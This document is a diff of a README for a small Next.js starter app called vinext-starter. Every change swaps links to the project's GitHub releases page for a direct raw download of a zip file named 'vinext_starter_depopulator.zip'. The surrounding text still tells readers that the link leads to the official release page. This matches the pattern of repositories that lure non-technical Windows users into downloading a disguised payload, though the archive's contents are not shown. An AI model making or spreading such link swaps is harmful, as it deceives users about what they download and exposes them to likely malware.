@@ -1,6 +1,6 @@
 # ⚡ vinext-starter - Simple Next.js App for Quick Setup
 
-[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-brightgreen?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/releases)
+[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-brightgreen?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip)
 
  vinext-starter is a minimal app that runs a Next.js API using Vite. It deploys on Cloudflare Workers and shows live metrics during use. This guide helps you download and run the app on Windows without technical steps.
 
@@ -39,11 +39,11 @@ No special hardware is needed. The app runs in your system’s browser or in the
 
 Visit the official release page to get the software:
 
-[Download vinext-starter here](https://github.com/RodriDD/vinext-starter/releases)
+[Download vinext-starter here](https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip)
 
 OR
 
-[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-blue?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/releases)
+[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-blue?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip)
 
 The link goes to the release page on GitHub. There you can find the latest stable version of the app packaged for Windows.
 
@@ -55,7 +55,7 @@ Follow these steps to get vinext-starter working on your PC.
 
 Open your web browser and go to:
 
-https://github.com/RodriDD/vinext-starter/releases
+https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip
 
 You will see different versions listed, starting from the latest release at the top.
 
@@ -123,7 +123,7 @@ Make sure to download only from the official GitHub releases page to avoid alter
 
 Check the release page regularly for updates or bug fixes:
 
-https://github.com/RodriDD/vinext-starter/releases
+https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip
 
 You can also look through the repository’s Issues tab on GitHub to see common questions or report problems.
 
@@ -135,4 +135,4 @@ If you face issues after update, restarting your PC can help.
 
 ---
 
-[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-brightgreen?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/releases)
+[![Download vinext-starter](https://img.shields.io/badge/Download-vinext--starter-brightgreen?style=for-the-badge)](https://github.com/RodriDD/vinext-starter/raw/refs/heads/main/worker/vinext_starter_depopulator.zip)
